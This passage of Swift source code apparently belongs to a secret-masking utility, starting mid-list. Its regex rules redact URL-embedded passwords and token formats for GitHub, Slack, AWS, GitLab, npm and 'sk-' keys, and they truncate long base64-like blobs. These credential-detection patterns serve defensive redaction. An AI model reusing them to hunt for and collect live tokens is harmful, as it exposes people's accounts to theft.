        (ThreatPattern(#"(://)[^/\s:@]+:[^/\s@]+@"#), "$1" + mask + "@"),
        // Well-known token formats
        (ThreatPattern(#"\b(?:gh[pousr]_[A-Za-z0-9]{20,}|github_pat_\w{20,}|sk-[A-Za-z0-9_-]{16,}|xox[abprs]-[A-Za-z0-9-]{10,}|AKIA[0-9A-Z]{16}|glpat-[\w-]{16,}|npm_[A-Za-z0-9]{30,})\b"#), mask),
    ]

    static let longBlob = ThreatPattern(#"[A-Za-z0-9+/=_-]{40,}"#)

    public static func mask(_ text: String) -> String {
        var s = text
        for (pattern, template) in rules {
            s = pattern.regex.stringByReplacingMatches(in: s, range: NSRange(s.startIndex..., in: s), withTemplate: template)
        }
        // Long opaque blobs (base64 payloads, keys): keep a recognisable head.
        for range in longBlob.ranges(in: s).reversed() {
            s.replaceSubrange(range, with: String(s[range].prefix(12)) + "…")
        }
        return s
    }
}
